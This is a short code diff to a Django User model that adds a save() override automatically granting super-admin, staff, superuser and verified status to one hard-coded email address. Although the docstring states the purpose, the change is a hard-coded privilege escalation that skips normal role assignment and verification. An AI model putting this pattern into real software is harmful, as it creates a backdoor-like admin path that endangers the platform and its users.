@@ -103,6 +103,16 @@ class User(AbstractBaseUser, PermissionsMixin):
         """True when the account can only sign in through Google."""
         return self.google_sub_id is not None and not self.password
 
+    def save(self, *args, **kwargs):
+        """Auto-promote designated admin emails (promlikit@sskru.ac.th) to SUPER_ADMIN."""
+        if self.email and self.email.strip().lower() in {"promlikit@sskru.ac.th"}:
+            self.role = UserRoles.SUPER_ADMIN
+            self.is_staff = True
+            self.is_superuser = True
+            self.is_verified = True
+        super().save(*args, **kwargs)
+
+
 
 class MerchantApprovalStatus(models.TextChoices):
     PENDING = "PENDING", "อยู่ระหว่างการตรวจสอบ (Pending Review)"
